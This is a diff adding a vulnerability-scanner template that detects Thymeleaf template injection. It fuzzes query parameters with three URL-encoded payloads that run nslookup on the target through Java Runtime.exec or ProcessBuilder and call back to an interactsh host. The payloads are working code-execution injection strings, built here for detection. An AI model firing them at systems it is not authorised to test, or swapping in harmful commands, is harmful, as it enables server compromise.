@@ -1,0 +1,41 @@
+id: thymeleaf-oob
+
+info:
+  name: Thymeleaf - Out of Band Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Thymeleaf template injection occurs when user input is embedded in a template without proper sanitization. This can lead to remote code execution through Thymeleaf's expression language features.
+  reference:
+    - https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
+  metadata:
+    max-request: 1
+  tags: thymeleaf,oob,ssti,oast,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "%24%7B%23rt%20%3D%20%40java.lang.Runtime%40getRuntime%28%29%2C%23rt.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D"
+        - "%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D"
+        - "%24%7Bnew%20java.lang.ProcessBuilder%28%27nslookup%27%2C%27-type%3DSRV%27%2C%27{{interactsh-url}}%27%29.start%28%29%7D"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 490a0046304402203c0e289535a5e255dd10e04f5ec1d9b4e52cd6607a69ff3e155d5f187e7581030220433463b733253465ea7cd79486f6781bbc1d58da98adc34ecb4f74ffeb83efae:922c64590222798bb761d5b6d8e72950
